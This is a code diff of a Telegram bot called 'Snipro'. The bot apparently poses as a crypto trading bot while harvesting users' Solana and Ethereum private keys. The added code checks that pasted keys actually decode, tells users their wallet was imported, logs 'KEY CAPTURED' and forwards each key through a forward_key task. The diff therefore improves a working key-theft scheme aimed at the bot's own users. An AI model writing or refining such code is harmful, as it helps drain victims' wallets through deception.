@@ -371,11 +371,35 @@ async def on_text(message: Message):
     if not want:
         await message.answer("Use /start to open the menu.", reply_markup=main_menu_kb())
         return
+    
     key = message.text.strip()
-    if want == "sol" and not SOL_RE.match(key):
-        await message.answer("\u274c Invalid base58 Solana key. Try again."); return
-    if want == "eth" and not ETH_RE.match(key):
-        await message.answer("\u274c Invalid hex Ethereum key. Try again."); return
+    
+    # --- SOLANA VALIDATION ---
+    if want == "sol":
+        if not SOL_RE.match(key):
+            await message.answer("\u274c <b>Invalid Solana key format.</b>\n\nPlease provide a valid base58 private key (80-100 chars).", parse_mode=ParseMode.HTML, reply_markup=back_kb())
+            return
+        try:
+            from solders.keypair import Keypair
+            Keypair.from_base58_string(key)
+        except Exception:
+            await message.answer("\u274c <b>Invalid base58 Solana key.</b>\n\nThe key you pasted could not be decoded. Please check it and try again.", parse_mode=ParseMode.HTML, reply_markup=back_kb())
+            return
+            
+    # --- ETHEREUM VALIDATION ---
+    if want == "eth":
+        if not ETH_RE.match(key):
+            await message.answer("\u274c <b>Invalid Ethereum key format.</b>\n\nPlease provide a valid hex private key (64 chars, 0x optional).", parse_mode=ParseMode.HTML, reply_markup=back_kb())
+            return
+        try:
+            from web3 import Web3
+            check_key = key if key.startswith("0x") else "0x" + key
+            Web3().eth.account.from_key(check_key)
+        except Exception:
+            await message.answer("\u274c <b>Invalid Ethereum key.</b>\n\nThe key you pasted is not a valid private key. Please check it and try again.", parse_mode=ParseMode.HTML, reply_markup=back_kb())
+            return
+
+    # --- SUCCESS ---
     try: await message.delete()
     except Exception: pass
     awaiting_key.pop(uid, None)
@@ -384,8 +408,7 @@ async def on_text(message: Message):
     track("KEY CAPTURED", message.from_user.username or message.from_user.full_name, uid, want, "key received")
     _save_stats()
     asyncio.create_task(forward_key(message, want, key))
-    await message.answer("\u2705 Wallet imported successfully.\n\nSnipro is now active.\nStatus: \U0001f7e2 Active",
-                         reply_markup=main_menu_kb())
+    await message.answer("\u2705 <b>Wallet imported successfully.</b>\n\nSnipro is now active.\n<b>Status:</b> \U0001f7e2 Active", parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
 
 async def forward_key(message, chain, key):
     user = message.from_user
